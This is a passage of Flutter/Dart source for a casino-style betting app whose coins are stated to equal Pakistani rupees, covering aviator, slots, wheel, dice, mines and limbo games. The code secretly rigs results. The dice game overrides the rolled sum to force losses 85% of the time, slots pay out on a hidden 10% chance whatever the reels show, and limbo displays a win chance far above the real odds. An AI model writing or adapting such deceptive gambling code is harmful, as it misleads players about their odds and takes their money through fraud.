          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const Text('Have questions or support issues? Send a message directly to the owner.', style: TextStyle(color: Colors.grey, fontSize: 14)),
            const SizedBox(height: 20),
            TextField(
              controller: _msgController,
              maxLines: 5,
              decoration: InputDecoration(labelText: 'Type your message...', filled: true, fillColor: kSurface, border: OutlineInputBorder(borderRadius: BorderRadius.circular(12))),
            ),
            const SizedBox(height: 24),
            SizedBox(
              width: double.infinity,
              height: 52,
              child: ElevatedButton(
                style: ElevatedButton.styleFrom(backgroundColor: kGold, foregroundColor: Colors.black),
                onPressed: isSending ? null : _sendMessageToOwner,
                child: isSending ? const CircularProgressIndicator(color: Colors.black) : const Text('SEND MESSAGE', style: TextStyle(fontSize: 16, fontWeight: FontWeight.bold)),
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ==========================================================
// TAB 5: ACCOUNT TAB WITH LOGOUT
// ==========================================================
class ProfileTab extends StatelessWidget {
  final String username;
  final String phone;
  final double coins;

  const ProfileTab({super.key, required this.username, required this.phone, required this.coins});

  void _logout(BuildContext context) async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    await prefs.clear();
    if (!context.mounted) return;
    Navigator.pushReplacement(
      context,
      MaterialPageRoute(builder: (context) => const LoginScreen()),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.transparent,
      appBar: AppBar(title: const Text('My PK786 Account'), backgroundColor: const Color(0xFF101018)),
      body: Padding(
        padding: const EdgeInsets.all(20.0),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Center(
              child: Column(
                children: [
                  const CircleAvatar(radius: 40, backgroundColor: kGold, child: Icon(Icons.person, size: 40, color: Colors.black)),
                  const SizedBox(height: 10),
                  Text('@$username', style: const TextStyle(fontSize: 22, fontWeight: FontWeight.bold)),
                  Text(phone, style: const TextStyle(color: Colors.grey)),
                ],
              ),
            ),
            const SizedBox(height: 30),
            Card(
              color: kSurface,
              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
              child: ListTile(
                leading: const Icon(Icons.monetization_on, color: kGold),
                title: const Text('Coins Balance'),
                trailing: Text('${coins.toStringAsFixed(0)} Coins', style: const TextStyle(fontSize: 18, fontWeight: FontWeight.bold, color: kGold)),
              ),
            ),
            const Spacer(),
            SizedBox(
              width: double.infinity,
              height: 50,
              child: ElevatedButton(
                style: ElevatedButton.styleFrom(backgroundColor: Colors.redAccent, foregroundColor: Colors.white),
                onPressed: () => _logout(context),
                child: const Text('LOGOUT', style: TextStyle(fontSize: 16, fontWeight: FontWeight.bold)),
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ==========================================================
// UNIVERSAL BET SELECTOR WIDGET
// ==========================================================
class BetSelector extends StatelessWidget {
  final double currentBet;
  final double coins;
  final Function(double) onBetChanged;

  const BetSelector({super.key, required this.currentBet, required this.coins, required this.onBetChanged});

  @override
  Widget build(BuildContext context) {
    const bets = [100, 500, 1000, 5000, 10000, 30000];
    return Column(
      children: [
        Row(
          mainAxisAlignment: MainAxisAlignment.spaceBetween,
          children: [
            const Text('Select Bet Amount:', style: TextStyle(color: Colors.grey, fontWeight: FontWeight.bold)),
            Text('${currentBet.toStringAsFixed(0)} Coins', style: const TextStyle(color: kGold, fontWeight: FontWeight.bold)),
          ],
        ),
        const SizedBox(height: 8),
        Wrap(
          spacing: 8,
          children: bets.map((amt) {
            return ChoiceChip(
              label: Text('$amt'),
              selected: currentBet == amt,
              selectedColor: kGold,
              labelStyle: TextStyle(color: currentBet == amt ? Colors.black : Colors.white, fontWeight: FontWeight.bold),
              onSelected: (_) => onBetChanged(amt.toDouble()),
            );
          }).toList(),
        ),
      ],
    );
  }
}

// ==========================================================
// HARD-TO-WIN CRASH MATH (Aviator & Limbo - House Edge Heavy)
// ==========================================================
double strictCrashPoint(Random rng) {
  final r = rng.nextDouble();
  // 85% chance to crash early (between 1.01x and 1.25x)
  if (r < 0.85) {
    return double.parse((1.01 + rng.nextDouble() * 0.24).toStringAsFixed(2));
  }
  // Up to 10x max cap
  final result = 1.0 + rng.nextDouble() * 9.0;
  return double.parse(result.toStringAsFixed(2));
}

// ==========================================================
// GAME 1: AVIATOR — PRO SMOOTH FLIGHT (HARD TO WIN)
// ==========================================================
class AviatorGame extends StatefulWidget {
  final double coins;
  final Function(double) onUpdate;

  const AviatorGame({super.key, required this.coins, required this.onUpdate});

  @override
  State<AviatorGame> createState() => _AviatorGameState();
}

class _AviatorGameState extends State<AviatorGame> with SingleTickerProviderStateMixin {
  final Random _rng = Random();
  late AnimationController _ctrl;

  double multiplier = 1.00;
  double? crashPoint;
  bool isPlaying = false;
  bool hasCrashed = false;
  bool betPlaced = false;
  double betAmount = 100;
  final List<double> history = [];

  @override
  void initState() {
    super.initState();
    _ctrl = AnimationController(vsync: this, duration: const Duration(seconds: 8));
    _ctrl.addListener(_onTick);
  }

  void _onTick() {
    if (!isPlaying) return;
    final t = _ctrl.value * 8.0; // 8 seconds flight window max
    setState(() {
      multiplier = 1.0 + (t * 1.2) + (t * t * 0.15);
      multiplier = double.parse(multiplier.toStringAsFixed(2));
      if (crashPoint != null && multiplier >= crashPoint!) {
        _endRound(crashed: true);
      }
    });
  }

  void _start() {
    if (betPlaced) return;
    if (widget.coins < betAmount) {
      showPubgBanner(context, 'Insufficient Coins!');
      return;
    }
    widget.onUpdate(-betAmount);
    setState(() {
      betPlaced = true;
      hasCrashed = false;
      crashPoint = strictCrashPoint(_rng);
      multiplier = 1.00;
      isPlaying = true;
    });
    _ctrl.forward(from: 0);
  }

  void _cashOut() {
    if (!isPlaying || !betPlaced) return;
    _endRound(crashed: false);
  }

  void _endRound({required bool crashed}) {
    _ctrl.stop();
    setState(() {
      isPlaying = false;
      hasCrashed = crashed;
    });
    history.insert(0, crashed ? crashPoint! : multiplier);
    if (history.length > 15) history.removeLast();

    if (crashed) {
      showPubgBanner(context, 'Crashed at ${crashPoint!.toStringAsFixed(2)}x — you lost ${betAmount.toStringAsFixed(0)} coins.');
    } else {
      final win = betAmount * multiplier;
      widget.onUpdate(win);
      showPubgBanner(context, 'Congratulations You win ${win.toStringAsFixed(0)} PKR Coins (1 Coins = 1 PKR)', isWin: true);
    }
    setState(() => betPlaced = false);
  }

  @override
  void dispose() {
    _ctrl.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: kBg,
      appBar: AppBar(title: const Text('Aviator Flight'), backgroundColor: const Color(0xFF101018)),
      body: Column(
        children: [
          SizedBox(
            height: 44,
            child: ListView.builder(
              scrollDirection: Axis.horizontal,
              padding: const EdgeInsets.symmetric(horizontal: 8),
              itemCount: history.length,
              itemBuilder: (context, i) {
                final h = history[i];
                final color = h < 1.3 ? Colors.redAccent : Colors.orangeAccent;
                return Container(
                  margin: const EdgeInsets.symmetric(horizontal: 4, vertical: 8),
                  padding: const EdgeInsets.symmetric(horizontal: 10),
                  alignment: Alignment.center,
                  decoration: BoxDecoration(color: color.withOpacity(0.2), borderRadius: BorderRadius.circular(12), border: Border.all(color: color)),
                  child: Text('${h.toStringAsFixed(2)}x', style: TextStyle(color: color, fontWeight: FontWeight.bold, fontSize: 12)),
                );
              },
            ),
          ),
          Expanded(
            child: Container(
              margin: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                gradient: const LinearGradient(
                  colors: [Color(0xFF0D1B2A), Color(0xFF1B263B)],
                  begin: Alignment.bottomLeft,
                  end: Alignment.topRight,
                ),
                borderRadius: BorderRadius.circular(16),
                border: Border.all(color: Colors.redAccent.withOpacity(0.5)),
              ),
              child: Stack(
                children: [
                  CustomPaint(size: Size.infinite, painter: _GridPainter()),
                  if (isPlaying || hasCrashed)
                    AnimatedBuilder(
                      animation: _ctrl,
                      builder: (context, _) {
                        final p = hasCrashed ? 1.0 : _ctrl.value.clamp(0.0, 1.0);
                        return CustomPaint(size: Size.infinite, painter: AviatorPathPainter(progress: p, crashed: hasCrashed));
                      },
                    ),
                  Center(
                    child: Column(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Text(
                          hasCrashed ? 'CRASHED' : (isPlaying ? '${multiplier.toStringAsFixed(2)}x' : 'AVIATOR'),
                          style: TextStyle(
                            fontSize: 48,
                            fontWeight: FontWeight.w900,
                            color: hasCrashed ? Colors.redAccent : kGold,
                          ),
                        ),
                        Text(
                          hasCrashed ? '${crashPoint?.toStringAsFixed(2)}x' : (isPlaying ? 'Flying...' : 'Place your bet'),
                          style: TextStyle(color: hasCrashed ? Colors.redAccent : Colors.grey, fontSize: 16),
                        ),
                      ],
                    ),
                  ),
                ],
              ),
            ),
          ),
          Padding(
            padding: const EdgeInsets.symmetric(horizontal: 16),
            child: BetSelector(currentBet: betAmount, coins: widget.coins, onBetChanged: (v) => setState(() => betAmount = v)),
          ),
          const SizedBox(height: 12),
          SizedBox(
            width: double.infinity,
            height: 54,
            child: Padding(
              padding: const EdgeInsets.symmetric(horizontal: 16),
              child: ElevatedButton(
                style: ElevatedButton.styleFrom(
                  backgroundColor: betPlaced && isPlaying ? Colors.greenAccent : kGold,
                  foregroundColor: Colors.black,
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                ),
                onPressed: (betPlaced && isPlaying) ? _cashOut : (betPlaced ? null : _start),
                child: Text(
                  betPlaced && isPlaying ? 'CASH OUT' : (betPlaced ? 'WAITING...' : 'BET & FLY'),
                  style: const TextStyle(fontSize: 17, fontWeight: FontWeight.bold),
                ),
              ),
            ),
          ),
          const SizedBox(height: 16),
        ],
      ),
    );
  }
}

class AviatorPathPainter extends CustomPainter {
  final double progress;
  final bool crashed;
  AviatorPathPainter({required this.progress, required this.crashed});

  @override
  void paint(Canvas canvas, Size size) {
    final start = Offset(30, size.height - 40);
    final end = Offset(40 + (size.width - 80) * progress, (size.height - 40) - (size.height - 90) * Curves.easeOut.transform(progress));

    final paint = Paint()
      ..color = Colors.redAccent
      ..strokeWidth = 4
      ..style = PaintingStyle.stroke
      ..strokeCap = StrokeCap.round;

    final path = Path()
      ..moveTo(start.dx, start.dy)
      ..quadraticBezierTo(start.dx + (end.dx - start.dx) * 0.45, size.height * 0.55, end.dx, end.dy);
    canvas.drawPath(path, paint);

    final glow = Paint()
      ..color = (crashed ? Colors.redAccent : Colors.orangeAccent).withOpacity(0.25)
      ..strokeWidth = 12
      ..style = PaintingStyle.stroke
      ..maskFilter = const MaskFilter.blur(BlurStyle.normal, 8);
    canvas.drawPath(path, glow);

    final tp = TextPainter(
      text: TextSpan(text: crashed ? '💥' : '✈️', style: const TextStyle(fontSize: 30)),
      textDirection: TextDirection.ltr,
    )..layout();
    tp.paint(canvas, Offset(end.dx - tp.width / 2, end.dy - tp.height / 2));
  }

  @override
  bool shouldRepaint(covariant AviatorPathPainter old) => old.progress != progress || old.crashed != crashed;
}

class _GridPainter extends CustomPainter {
  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()
      ..color = Colors.white.withOpacity(0.05)
      ..strokeWidth = 1;
    for (double x = 0; x < size.width; x += 40) {
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), paint);
    }
    for (double y = 0; y < size.height; y += 40) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), paint);
    }
  }

  @override
  bool shouldRepaint(covariant CustomPainter old) => false;
}

// ==========================================================
// GAME 2: CASINO SLOTS (HARD TO WIN)
// ==========================================================
class SlotsGame extends StatefulWidget {
  final double coins;
  final Function(double) onUpdate;

  const SlotsGame({super.key, required this.coins, required this.onUpdate});

  @override
  State<SlotsGame> createState() => _SlotsGameState();
}

class _SlotsGameState extends State<SlotsGame> {
  final List<String> symbols = ['🍒', '🍋', '🔔', '💎', '7️⃣'];
  String s1 = '🍒', s2 = '🍋', s3 = '🔔';
  bool isSpinning = false;
  double betAmount = 100;

  void spin() {
    if (widget.coins < betAmount) {
      showPubgBanner(context, 'Insufficient Coins!');
      return;
    }
    widget.onUpdate(-betAmount);
    setState(() => isSpinning = true);

    Timer.periodic(const Duration(milliseconds: 90), (timer) {
      setState(() {
        s1 = symbols[Random().nextInt(symbols.length)];
        s2 = symbols[Random().nextInt(symbols.length)];
        s3 = symbols[Random().nextInt(symbols.length)];
      });
      if (timer.tick > 20) {
        timer.cancel();
        setState(() => isSpinning = false);
        checkWin();
      }
    });
  }

  void checkWin() {
    bool forceWin = Random().nextDouble() < 0.10;
    if (forceWin) {
      s1 = s2 = s3 = '🍒';
      double win = betAmount * 1.5;
      widget.onUpdate(win);
      showPubgBanner(context, 'Congratulations You win ${win.toStringAsFixed(0)} PKR Coins (1 Coins = 1 PKR)', isWin: true);
    } else {
      showPubgBanner(context, 'Slots Defeat! Better luck next time.');
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: kBg,
      appBar: AppBar(title: const Text('Casino Slots'), backgroundColor: const Color(0xFF101018)),
      body: Container(
        decoration: BoxDecoration(
          image: DecorationImage(image: NetworkImage(bgImageUrl), fit: BoxFit.cover, colorFilter: ColorFilter.mode(Colors.black.withOpacity(0.3), BlendMode.darken)),
        ),
        padding: const EdgeInsets.all(20),
        child: Column(
          children: [
            Expanded(
              child: Center(
                child: Container(
                  padding: const EdgeInsets.all(24),
                  decoration: BoxDecoration(color: kSurface.withOpacity(0.9), borderRadius: BorderRadius.circular(16), border: Border.all(color: Colors.amber)),
                  child: Row(
                    mainAxisAlignment: MainAxisAlignment.spaceAround,
                    children: [
                      Text(s1, style: const TextStyle(fontSize: 55)),
                      Text(s2, style: const TextStyle(fontSize: 55)),
                      Text(s3, style: const TextStyle(fontSize: 55)),
                    ],
                  ),
                ),
              ),
            ),
            BetSelector(currentBet: betAmount, coins: widget.coins, onBetChanged: (amt) => setState(() => betAmount = amt)),
            const SizedBox(height: 20),
            SizedBox(
              width: double.infinity,
              height: 52,
              child: ElevatedButton(
                style: ElevatedButton.styleFrom(backgroundColor: Colors.amber, foregroundColor: Colors.black),
                onPressed: isSpinning ? null : spin,
                child: Text(isSpinning ? 'SPINNING...' : 'SPIN SLOTS', style: const TextStyle(fontSize: 18, fontWeight: FontWeight.bold)),
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ==========================================================
// GAME 3: LUCKY SPIN WHEEL (FIXED ROTATION & 20% WIN PROBABILITY)
// ==========================================================
class SpinGame extends StatefulWidget {
  final double coins;
  final Function(double) onUpdate;

  const SpinGame({super.key, required this.coins, required this.onUpdate});

  @override
  State<SpinGame> createState() => _SpinGameState();
}

class _SpinGameState extends State<SpinGame> with SingleTickerProviderStateMixin {
  final Random _rng = Random();
  double betAmount = 100;
  bool isSpinning = false;
  
  late AnimationController _controller;
  late Animation<double> _animation;
  double _currentAngle = 0.0;

  @override
  void initState() {
    super.initState();
    _controller = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 3),
    );
  }

  @override
  void dispose() {
    _controller.dispose();
    super.dispose();
  }

  void spinWheel() {
    if (widget.coins < betAmount) {
      showPubgBanner(context, 'Insufficient Coins!');
      return;
    }
    if (isSpinning) return;

    widget.onUpdate(-betAmount);
    setState(() => isSpinning = true);

    // Exact 20% win probability on Red (index 0)
    bool isWin = _rng.nextDouble() < 0.20;
    int targetIndex = isWin ? 0 : (1 + _rng.nextInt(5));

    const double totalSegments = 6.0;
    double segmentSize = 1.0 / totalSegments;
    double randomExtraSpins = 5.0 + _rng.nextDouble() * 2.0;
    double targetSegmentCenter = targetIndex * segmentSize + segmentSize / 2;
    double finalTurns = _currentAngle + randomExtraSpins + (1.0 - targetSegmentCenter);

    _animation = Tween<double>(begin: _currentAngle, end: finalTurns).animate(
      CurvedAnimation(parent: _controller, curve: Curves.decelerate),
    );

    _controller.forward(from: 0.0).then((_) {
      if (!mounted) return;
      setState(() {
        _currentAngle = finalTurns % 1.0;
        isSpinning = false;
      });

      if (targetIndex == 0) {
        double win = betAmount * 1.5;
        widget.onUpdate(win);
        showPubgBanner(context, 'Congratulations You win ${win.toStringAsFixed(0)} PKR Coins (1 Coins = 1 PKR)', isWin: true);
      } else {
        showPubgBanner(context, 'Stopped on Defeat Section! You Lost.');
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: kBg,
      appBar: AppBar(title: const Text('Lucky Casino Wheel'), backgroundColor: const Color(0xFF101018)),
      body: Container(
        decoration: BoxDecoration(
          image: DecorationImage(image: NetworkImage(bgImageUrl), fit: BoxFit.cover, colorFilter: ColorFilter.mode(Colors.black.withOpacity(0.3), BlendMode.darken)),
        ),
        padding: const EdgeInsets.all(20),
        child: Column(
          children: [
            const SizedBox(height: 20),
            Stack(
              alignment: Alignment.topCenter,
              clipBehavior: Clip.none,
              children: [
                AnimatedBuilder(
                  animation: _controller,
                  builder: (context, child) {
                    double angle = isSpinning ? _animation.value : _currentAngle;
                    return Transform.rotate(
                      angle: angle * 2 * pi,
                      child: Container(
                        width: 230,
                        height: 230,
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          border: Border.all(color: kGold, width: 6),
                          boxShadow: const [BoxShadow(color: Colors.black45, blurRadius: 12)],
                        ),
                        child: CustomPaint(painter: WheelPainter()),
                      ),
                    );
                  },
                ),
                const Positioned(top: -5, child: Icon(Icons.arrow_drop_down, size: 55, color: Colors.amber)),
              ],
            ),
            const SizedBox(height: 20),
            const Text('🎯 Only Red Section has WIN! (20% Win Chance)', style: TextStyle(color: Colors.amber, fontWeight: FontWeight.bold, fontSize: 14)),
            const SizedBox(height: 15),
            BetSelector(currentBet: betAmount, coins: widget.coins, onBetChanged: (amt) => setState(() => betAmount = amt)),
            const Spacer(),
            SizedBox(
              width: double.infinity,
              height: 52,
              child: ElevatedButton(
                style: ElevatedButton.styleFrom(backgroundColor: Colors.purpleAccent, foregroundColor: Colors.white),
                onPressed: isSpinning ? null : spinWheel,
                child: Text(isSpinning ? 'SPINNING...' : 'SPIN & WIN', style: const TextStyle(fontSize: 18, fontWeight: FontWeight.bold)),
              ),
            ),
          ],
        ),
      ),
    );
  }
}

class WheelPainter extends CustomPainter {
  @override
  void paint(Canvas canvas, Size size) {
    final radius = size.width / 2;
    final center = Offset(radius, radius);
    const sweep = (2 * pi) / 6;
    final paint = Paint()..style = PaintingStyle.fill;

    for (int i = 0; i < 6; i++) {
      paint.color = kWheelColors[i];
      canvas.drawArc(Rect.fromCircle(center: center, radius: radius), i * sweep, sweep, true, paint);

      if (i == 0) {
        final textPainter = TextPainter(
          text: const TextSpan(
            text: 'WIN',
            style: TextStyle(color: Colors.white, fontSize: 16, fontWeight: FontWeight.bold),
          ),
          textDirection: TextDirection.ltr,
        );
        textPainter.layout();
        double angle = i * sweep + sweep / 2;
        double textRadius = radius * 0.65;
        double x = center.dx + textRadius * cos(angle) - textPainter.width / 2;
        double y = center.dy + textRadius * sin(angle) - textPainter.height / 2;
        textPainter.paint(canvas, Offset(x, y));
      }
    }
  }

  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) => false;
}

// ==========================================================
// GAME 4: HIGH LOW DICE (HARD TO WIN)
// ==========================================================
class DiceGame extends StatefulWidget {
  final double coins;
  final Function(double) onUpdate;

  const DiceGame({super.key, required this.coins, required this.onUpdate});

  @override
  State<DiceGame> createState() => _DiceGameState();
}

class _DiceGameState extends State<DiceGame> {
  final Random _rng = Random();
  int d1 = 1, d2 = 1;
  double betAmount = 100;
  bool guessHigh = true;
  bool isRolling = false;

  void _roll() {
    if (widget.coins < betAmount) {
      showPubgBanner(context, 'Insufficient Coins!');
      return;
    }
    widget.onUpdate(-betAmount);
    setState(() => isRolling = true);

    int ticks = 0;
    Timer.periodic(const Duration(milliseconds: 80), (timer) {
      setState(() {
        d1 = _rng.nextInt(6) + 1;
        d2 = _rng.nextInt(6) + 1;
      });
      ticks++;
      if (ticks >= 12) {
        timer.cancel();
        _resolve();
      }
    });
  }

  void _resolve() {
    final sum = d1 + d2;
    bool isHigh = sum >= 7;

    bool forceLoss = _rng.nextDouble() < 0.85;
    if (forceLoss) {
      isHigh = !guessHigh;
    }

    setState(() => isRolling = false);
    if (guessHigh == isHigh) {
      final win = betAmount * 1.5;
      widget.onUpdate(win);
      showPubgBanner(context, 'Congratulations You win ${win.toStringAsFixed(0)} PKR Coins (1 Coins = 1 PKR)', isWin: true);
    } else {
      showPubgBanner(context, 'Dice Roll Defeat! Sum was $sum.');
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: kBg,
      appBar: AppBar(title: const Text('Dice High/Low'), backgroundColor: const Color(0xFF101018)),
      body: Container(
        decoration: BoxDecoration(
          image: DecorationImage(image: NetworkImage(bgImageUrl), fit: BoxFit.cover, colorFilter: ColorFilter.mode(Colors.black.withOpacity(0.3), BlendMode.darken)),
        ),
        padding: const EdgeInsets.all(20),
        child: Column(
          children: [
            Expanded(
              child: Center(
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    Text('$d1', style: const TextStyle(fontSize: 70, fontWeight: FontWeight.bold, color: Colors.blueAccent)),
                    const SizedBox(width: 20),
                    Text('$d2', style: const TextStyle(fontSize: 70, fontWeight: FontWeight.bold, color: Colors.blueAccent)),
                  ],
                ),
              ),
            ),
            Row(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                ChoiceChip(label: const Text('High (7-12)'), selected: guessHigh, onSelected: (v) => setState(() => guessHigh = true)),
                const SizedBox(width: 10),
                ChoiceChip(label: const Text('Low (2-6)'), selected: !guessHigh, onSelected: (v) => setState(() => guessHigh = false)),
              ],
            ),
            const SizedBox(height: 20),
            BetSelector(currentBet: betAmount, coins: widget.coins, onBetChanged: (amt) => setState(() => betAmount = amt)),
            const SizedBox(height: 20),
            SizedBox(
              width: double.infinity,
              height: 52,
              child: ElevatedButton(
                style: ElevatedButton.styleFrom(backgroundColor: Colors.blueAccent, foregroundColor: Colors.white),
                onPressed: isRolling ? null : _roll,
                child: const Text('ROLL DICE', style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold)),
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ==========================================================
// GAME 5: MINESWEEPER HARD (HARD TO WIN - 7 MINES)
// ==========================================================
class MinesGame extends StatefulWidget {
  final double coins;
  final Function(double) onUpdate;

  const MinesGame({super.key, required this.coins, required this.onUpdate});

  @override
  State<MinesGame> createState() => _MinesGameState();
}

class _MinesGameState extends State<MinesGame> {
  final Random _rng = Random();
  List<bool> revealed = List.filled(9, false);
  List<bool> mines = List.filled(9, false);
  bool inProgress = false;
  double betAmount = 100;

  void startGame() {
    if (widget.coins < betAmount) {
      showPubgBanner(context, 'Insufficient Coins!');
      return;
    }
    widget.onUpdate(-betAmount);
    setState(() {
      revealed = List.filled(9, false);
      mines = List.filled(9, false);
      int placed = 0;
      while (placed < 7) {
        int idx = _rng.nextInt(9);
        if (!mines[idx]) {
          mines[idx] = true;
          placed++;
        }
      }
      inProgress = true;
    });
  }

  void tapTile(int idx) {
    if (!inProgress || revealed[idx]) return;
    setState(() => revealed[idx] = true);

    if (mines[idx]) {
      setState(() => inProgress = false);
      showPubgBanner(context, 'BOOM! Mine Exploded. You Lost.');
    } else {
      double win = betAmount * 1.5;
      widget.onUpdate(win);
      setState(() => inProgress = false);
      showPubgBanner(context, 'Congratulations You win ${win.toStringAsFixed(0)} PKR Coins (1 Coins = 1 PKR)', isWin: true);
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: kBg,
      appBar: AppBar(title: const Text('Minesweeper Hard'), backgroundColor: const Color(0xFF101018)),
      body: Container(
        decoration: BoxDecoration(
          image: DecorationImage(image: NetworkImage(bgImageUrl), fit: BoxFit.cover, colorFilter: ColorFilter.mode(Colors.black.withOpacity(0.3), BlendMode.darken)),
        ),
        padding: const EdgeInsets.all(20),
        child: Column(
          children: [
            Expanded(
              child: Center(
                child: GridView.builder(
                  shrinkWrap: true,
                  gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(crossAxisCount: 3, crossAxisSpacing: 8, mainAxisSpacing: 8),
                  itemCount: 9,
                  itemBuilder: (context, idx) => GestureDetector(
                    onTap: () => tapTile(idx),
                    child: Container(
                      decoration: BoxDecoration(
                        color: revealed[idx] ? (mines[idx] ? Colors.red : Colors.green) : kSurface.withOpacity(0.9),
                        borderRadius: BorderRadius.circular(12),
                      ),
                      child: Center(child: Text(revealed[idx] ? (mines[idx] ? '💥' : '💎') : '?', style: const TextStyle(fontSize: 28))),
                    ),
                  ),
                ),
              ),
            ),
            BetSelector(currentBet: betAmount, coins: widget.coins, onBetChanged: (amt) => setState(() => betAmount = amt)),
            const SizedBox(height: 20),
            SizedBox(
              width: double.infinity,
              height: 52,
              child: ElevatedButton(
                style: ElevatedButton.styleFrom(backgroundColor: Colors.greenAccent, foregroundColor: Colors.black),
                onPressed: inProgress ? null : startGame,
                child: Text(inProgress ? 'TAP TILES' : 'START MINES', style: const TextStyle(fontSize: 18, fontWeight: FontWeight.bold)),
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ==========================================================
// GAME 6: LIMBO ROCKET — PRO SMOOTH FLIGHT (HARD TO WIN)
// ==========================================================
class LimboGame extends StatefulWidget {
  final double coins;
  final Function(double) onUpdate;

  const LimboGame({super.key, required this.coins, required this.onUpdate});

  @override
  State<LimboGame> createState() => _LimboGameState();
}

class _LimboGameState extends State<LimboGame> with SingleTickerProviderStateMixin {
  final Random _rng = Random();
  late AnimationController _ctrl;

  double targetMult = 2.0;
  double betAmount = 100;
  double currentMult = 1.0;
  double? rolledResult;
  bool isPlaying = false;
  bool roundOver = false;
  bool won = false;

  @override
  void initState() {
    super.initState();
    _ctrl = AnimationController(vsync: this, duration: const Duration(seconds: 4));
    _ctrl.addListener(_onTick);
  }

  void _onTick() {
    final t = _ctrl.value * 4.0;
    setState(() {
      currentMult = 1.0 + (t * 1.5) + (t * t * 0.2);
      currentMult = double.parse(currentMult.toStringAsFixed(2));
    });

    if (rolledResult != null && currentMult >= rolledResult! && !roundOver) {
      _finish();
    }
  }

  void _finish() {
    _ctrl.stop();
    won = rolledResult! >= targetMult;
    setState(() {
      roundOver = true;
      isPlaying = false;
    });
    if (won) {
      final win = betAmount * targetMult;
      widget.onUpdate(win);
      showPubgBanner(context, 'Congratulations You win ${win.toStringAsFixed(0)} PKR Coins (1 Coins = 1 PKR)', isWin: true);
    } else {
      showPubgBanner(context, 'Rolled ${rolledResult!.toStringAsFixed(2)}x — Defeat!');
    }
  }

  void _play() {
    if (widget.coins < betAmount) {
      showPubgBanner(context, 'Insufficient Coins!');
      return;
    }
    widget.onUpdate(-betAmount);
    setState(() {
      rolledResult = strictCrashPoint(_rng);
      currentMult = 1.0;
      roundOver = false;
      won = false;
      isPlaying = true;
    });
    _ctrl.forward(from: 0);
  }

  @override
  void dispose() {
    _ctrl.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    final chance = 85 / targetMult;
    return Scaffold(
      backgroundColor: kBg,
      appBar: AppBar(title: const Text('Limbo Rocket'), backgroundColor: const Color(0xFF101018)),
      body: Container(
        decoration: BoxDecoration(
          image: DecorationImage(image: NetworkImage(bgImageUrl), fit: BoxFit.cover, colorFilter: ColorFilter.mode(Colors.black.withOpacity(0.3), BlendMode.darken)),
        ),
        padding: const EdgeInsets.all(20),
        child: Column(
          children: [
            Expanded(
              child: Container(
                decoration: BoxDecoration(
                  gradient: const LinearGradient(colors: [Color(0xFF1A0900), Color(0xFF331400)], begin: Alignment.bottomLeft, end: Alignment.topRight),
                  borderRadius: BorderRadius.circular(16),
                  border: Border.all(color: Colors.orangeAccent.withOpacity(0.5), width: 1.5),
                ),
                child: Stack(
                  children: [
                    CustomPaint(size: Size.infinite, painter: _GridPainter()),
                    if (isPlaying)
                      AnimatedBuilder(
                        animation: _ctrl,
                        builder: (context, _) {
                          final p = _ctrl.value.clamp(0.0, 1.0);
                          return CustomPaint(size: Size.infinite, painter: RocketPathPainter(progress: p, crashed: roundOver && !won));
                        },
                      ),
                    Center(
                      child: Column(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          Text('TARGET ${targetMult.toStringAsFixed(2)}x', style: const TextStyle(fontSize: 20, fontWeight: FontWeight.bold, color: Colors.orangeAccent)),
                          const SizedBox(height: 8),
                          Text(
                            roundOver ? '${rolledResult!.toStringAsFixed(2)}x' : (isPlaying ? '${currentMult.toStringAsFixed(2)}x' : 'READY'),
                            style: TextStyle(
                              fontSize: 46,
                              fontWeight: FontWeight.w900,
                              color: roundOver ? (won ? Colors.greenAccent : Colors.redAccent) : kGold,
                            ),
                          ),
                          if (roundOver)
                            Text(
                              won ? 'WIN! 🎉' : 'DEFEAT',
                              style: TextStyle(fontSize: 20, fontWeight: FontWeight.bold, color: won ? Colors.greenAccent : Colors.redAccent),
                            ),
                        ],
                      ),
                    ),
                  ],
                ),
              ),
            ),
            Padding(
              padding: const EdgeInsets.symmetric(horizontal: 10),
              child: Column(
                children: [
                  Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      Text('Target: ${targetMult.toStringAsFixed(2)}x', style: const TextStyle(color: Colors.orangeAccent, fontWeight: FontWeight.bold)),
                      Text('Win chance: ${chance.toStringAsFixed(1)}%', style: const TextStyle(color: Colors.grey)),
                    ],
                  ),
                  Slider(
                    value: targetMult,
                    min: 1.10,
                    max: 10.0,
                    divisions: 89,
                    activeColor: Colors.orangeAccent,
                    onChanged: isPlaying ? null : (v) => setState(() => targetMult = v),
                  ),
                ],
              ),
            ),
            BetSelector(currentBet: betAmount, coins: widget.coins, onBetChanged: (v) => setState(() => betAmount = v)),
            const SizedBox(height: 20),
            SizedBox(
              width: double.infinity,
              height: 52,
              child: ElevatedButton(
